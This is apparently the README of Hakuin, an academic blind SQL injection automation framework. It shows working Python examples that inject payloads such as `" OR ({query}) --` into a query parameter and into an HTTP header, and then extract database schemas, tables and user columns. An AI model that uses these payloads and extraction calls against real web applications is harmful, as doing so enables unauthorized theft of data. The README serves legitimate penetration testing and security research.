<p align="center">
    <img width="150" src="https://raw.githubusercontent.com/pruzko/hakuin/main/logo.png">
</p>

Hakuin is a Blind SQL Injection (BSQLI) optimization and automation framework written in Python 3. It abstracts away the inference logic and allows users to easily and efficiently extract databases (DB) from vulnerable web applications. To speed up the process, Hakuin utilizes a variety of optimization methods, including pre-trained and adaptive language models, opportunistic guessing, parallelism and more.

Hakuin has been presented at esteemed academic and industrial conferences:
- [BlackHat MEA, Riyadh](https://blackhatmea.com/session/hakuin-injecting-brain-blind-sql-injection), 2023
- [Hack in the Box, Phuket](https://conference.hitb.org/hitbsecconf2023hkt/session/hakuin-injecting-brains-into-blind-sql-injection/), 2023
- [IEEE S&P Workshop on Offsensive Technology (WOOT)](https://wootconference.org/papers/woot23-paper17.pdf), 2023

More information can be found in our [paper](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_WOOT_23.pdf) and [slides](https://github.com/pruzko/hakuin/blob/main/publications/Hakuin_HITB_23.pdf).


## Installation
To install Hakuin, simply run:
```
pip3 install hakuin
```
Developers should install the package locally and set the `-e` flag for editable mode:
```
git clone git@github.com:pruzko/hakuin.git
cd hakuin
pip3 install -e .
```


## Examples
Once you identify a BSQLI vulnerability, you need to tell Hakuin how to inject its queries. To do this, derive a class from the `Requester` and override the `request` method. Also, the method must determine whether the query resolved to `True` or `False`.


##### Example 1 - Query Parameter Injection with Status-based Inference
```python
import aiohttp
from hakuin import Requester

class StatusRequester(Requester):
    async def request(self, ctx, query):
        r = await aiohttp.get(f'http://vuln.com/?n=XXX" OR ({query}) --')
        return r.status == 200
```

##### Example 2 - Header Injection with Content-based Inference
```python
class ContentRequester(Requester):
    async def request(self, ctx, query):
        headers = {'vulnerable-header': f'xxx" OR ({query}) --'}
        r = await aiohttp.get(f'http://vuln.com/', headers=headers)
        return 'found' in await r.text()
```

To start extracting data, use the `Extractor` class. It requires a `DBMS` object to contruct queries and a `Requester` object to inject them. Hakuin currently supports `SQLite`, `MySQL`, `PSQL` (PostgreSQL), and `MSSQL` (SQL Server) DBMSs, but will soon include more options. If you wish to support another DBMS, implement the `DBMS` interface defined in `hakuin/dbms/DBMS.py`.

##### Example 1 - Extracting SQLite/MySQL/PSQL/MSSQL
```python
import asyncio
from hakuin import Extractor, Requester
from hakuin.dbms import SQLite, MySQL, PSQL, MSSQL

class StatusRequester(Requester):
    ...

async def main():
    # requester:    Use this Requester
    # dbms:         Use this DBMS
    # n_tasks:      Spawns N tasks that extract column rows in parallel 
    ext = Extractor(requester=StatusRequester(), dbms=SQLite(), n_tasks=1)
    ...

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())
```

Now that eveything is set, you can start extracting DB metadata.

##### Example 1 - Extracting DB Schemas
```python
# strategy:
#   'binary':   Use binary search
#   'model':    Use pre-trained model
schema_names = await ext.extract_schema_names(strategy='model')
```

##### Example 2 - Extracting Tables
```python
tables = await ext.extract_table_names(strategy='model')
```

##### Example 3 - Extracting Columns
```python
columns = await ext.extract_column_names(table='users', strategy='model')
```

##### Example 4 - Extracting Tables and Columns Together
```python
metadata = await ext.extract_meta(strategy='model')
```

Once you know the structure, you can extract the actual content.

##### Example 1 - Extracting Generic Columns
```python
# text_strategy:    Use this strategy if the column is text
res = await ext.extract_column(table='users', column='address', text_strategy='dynamic')
```

##### Example 2 - Extracting Textual Columns
```python
# strategy:
#   'binary':       Use binary search
#   'fivegram':     Use five-gram model
#   'unigram':      Use unigram model
#   'dynamic':      Dynamically identify the best strategy. This setting
#                   also enables opportunistic guessing.
res = await ext.extract_column_text(table='users', column='address', strategy='dynamic')
```

##### Example 3 - Extracting Integer Columns
```python
res = await ext.extract_column_int(table='users', column='id')
```

##### Example 4 - Extracting Float Columns
```python
res = await ext.extract_column_float(table='products', column='price')
```

##### Example 5 - Extracting Blob (Binary Data) Columns
```python
res = await ext.extract_column_blob(table='users', column='id')
```

More examples can be found in the `tests` directory.


## Using Hakuin from the Command Line
Hakuin comes with a simple wrapper tool, `hk.py`, that allows you to use Hakuin's basic functionality directly from the command line. To find out more, run:
```
python3 hk.py -h
```


## For Researchers
This repository is actively developed to fit the needs of security practitioners. Researchers looking to reproduce the experiments described in our paper should install the [frozen version](https://zenodo.org/record/7804243) as it contains the original code, experiment scripts, and an instruction manual for reproducing the results.


#### Cite Hakuin
```
@inproceedings{hakuin_bsqli,
  title={Hakuin: Optimizing Blind SQL Injection with Probabilistic Language Models},
  author={Pru{\v{z}}inec, Jakub and Nguyen, Quynh Anh},
  booktitle={2023 IEEE Security and Privacy Workshops (SPW)},
  pages={384--393},
  year={2023},
  organization={IEEE}
}
```
